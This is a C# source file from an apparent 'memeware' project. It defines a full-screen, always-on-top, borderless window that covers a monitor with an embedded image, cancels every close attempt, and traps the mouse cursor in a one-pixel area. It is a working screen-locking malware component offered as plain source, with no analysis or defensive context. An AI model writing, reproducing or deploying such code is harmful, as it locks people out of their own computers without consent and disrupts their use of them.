//#approved 08/05/2022 2:30pm
using System.Drawing;
using System.Windows.Forms;
namespace MysteryMemeware
{
    public sealed class DisplayCoverForm : Form
    {
        public const string CoverImageResourceName = "MysteryMemeware.CoverImage.bmp";
        public DisplayCoverForm(int screenID)
        {
            BackColor = Color.White;
            ShowInTaskbar = false;
            TopMost = true;
            FormBorderStyle = FormBorderStyle.None;
            StartPosition = FormStartPosition.Manual;
            Screen screen = Screen.AllScreens[screenID];
            Location = screen.Bounds.Location;
            Width = screen.Bounds.Width;
            Height = screen.Bounds.Height;
            CustomPictureBox customPictureBox = new();
            double targetAspectRatio = customPictureBox.Image.Width / (double)customPictureBox.Image.Height;
            double viewPortWidth = screen.Bounds.Width;
            double viewPortHeight = screen.Bounds.Height;
            double renderWidth = viewPortHeight * targetAspectRatio;
            double renderHeight = viewPortWidth / targetAspectRatio;
            if (renderWidth > viewPortWidth)
            {
                renderWidth = viewPortWidth;
            }
            if (renderHeight > viewPortHeight)
            {
                renderHeight = viewPortHeight;
            }
            double renderX = (viewPortWidth - renderWidth) / 2;
            double renderY = (viewPortHeight - renderHeight) / 2;
            customPictureBox.Location = new Point((int)renderX, (int)renderY);
            customPictureBox.Width = (int)renderWidth;
            customPictureBox.Height = (int)renderHeight;
            customPictureBox.Image = Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream(CoverImageResourceName));
            customPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
            Controls.Add(customPictureBox);
            FormClosing += OnFormClosing;
            Cursor.Clip = new Rectangle(Location, new Size(1, 1));
            TopMost = true;
        }
        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}